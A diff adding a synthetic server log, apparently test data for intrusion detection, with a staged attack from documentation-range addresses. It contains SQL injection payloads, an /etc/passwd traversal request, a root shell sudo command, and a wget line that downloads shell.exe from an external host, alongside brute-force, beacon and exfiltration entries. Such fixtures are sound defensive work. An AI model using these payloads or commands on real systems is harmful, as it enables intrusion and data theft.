@@ -1,0 +1,23 @@
+2024-03-15 00:00:00 10.0.0.1 GET /health HTTP/1.1 200 64
+2024-03-15 00:01:00 192.168.1.10 GET /index.html HTTP/1.1 200 2048
+2024-03-15 00:01:30 192.168.1.11 POST /api/login HTTP/1.1 200 128
+2024-03-15 01:15:00 sshd[2001]: Failed password for root from 198.51.100.50 port 60001 ssh2
+2024-03-15 01:15:01 sshd[2001]: Failed password for root from 198.51.100.50 port 60002 ssh2
+2024-03-15 01:15:02 sshd[2001]: Failed password for admin from 198.51.100.50 port 60003 ssh2
+2024-03-15 01:15:03 sshd[2001]: authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=198.51.100.50
+2024-03-15 01:15:04 sshd[2001]: Failed password for ubuntu from 198.51.100.50 port 60004 ssh2
+2024-03-15 01:15:05 sshd[2001]: Too many authentication failures for root from 198.51.100.50
+2024-03-15 02:30:00 198.51.100.50 GET "/api/users?id=1 UNION SELECT username,password FROM users--" HTTP/1.1 200 4096
+2024-03-15 02:30:02 198.51.100.50 GET "/api/search?q=1' OR 1=1--" HTTP/1.1 200 51200
+2024-03-15 02:30:04 WAF: SQL Injection blocked - INFORMATION_SCHEMA query from 198.51.100.50
+2024-03-15 03:00:00 syslog: wget http://198.51.100.99/shell.exe -O /tmp/shell.exe
+2024-03-15 03:00:02 antivirus: virus_detected in /tmp/shell.exe - malware signature matched
+2024-03-15 03:00:04 netflow: C2 beacon checkin 192.168.1.50 -> 198.51.100.99:443
+2024-03-15 03:00:06 198.51.100.50 GET /admin HTTP/1.1 403 Forbidden - unauthorized access attempt
+2024-03-15 03:00:08 198.51.100.50 GET /../../etc/passwd HTTP/1.1 400 Bad Request - directory traversal
+2024-03-15 03:00:10 syslog: privilege escalation attempt: sudo -u root /bin/bash
+2024-03-15 04:00:00 192.168.1.50 POST /api/export/users HTTP/1.1 200 26214400
+2024-03-15 04:00:02 DLP: data_out=26214400 - unusual outbound transfer to external IP detected
+2024-03-15 04:00:04 SIEM: data exfiltration alert - sensitive data leaked to 198.51.100.99
+2024-03-15 04:00:06 DNS: dns_query for exfil.198.51.100.tk (DNS tunnel suspected)
+2024-03-15 04:30:00 192.168.1.1 GET /health HTTP/1.1 200 64
